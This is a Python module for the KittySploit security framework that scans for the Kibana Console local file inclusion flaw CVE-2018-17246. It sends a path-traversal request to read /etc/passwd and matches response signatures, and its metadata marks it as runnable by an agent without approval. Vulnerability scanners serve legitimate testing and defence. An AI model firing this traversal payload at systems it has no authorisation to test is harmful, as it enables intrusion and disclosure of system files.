#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Kibana versions before 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Kibana - Local File Inclusion Detection',
        'description': 'Kibana versions before 6.4.3 and 5.6.13 contain an arbitrary file inclusion flaw in the Console plugin. An attacker with access to the Kibana Console API could send a request that will attempt to execute JavaScript which could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'lfi', 'kibana', 'vulhub', 'elastic', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/vulhub/vulhub/blob/master/kibana/CVE-2018-17246/README.md',
            'https://www.elastic.co/community/security',
            'https://discuss.elastic.co/t/elastic-stack-6-4-3-and-5-6-13-security-update/155594',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-17246',
            'https://access.redhat.com/errata/RHBA-2018:3743',
        ],
        'cve': 'CVE-2018-17246',
    }

    def run(self):
        r = self.http_request(method="GET", path='/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items()).lower()
        server = (r.headers.get("Server") or r.headers.get("server") or "").lower()
        body_any = ('"message":"an internal server error occurred"',)
        header_any = ('kbn-name', 'kibana', 'application/json',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="Kibana - Local File Inclusion detected",
                path='/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd',
            )
            return True
        return False

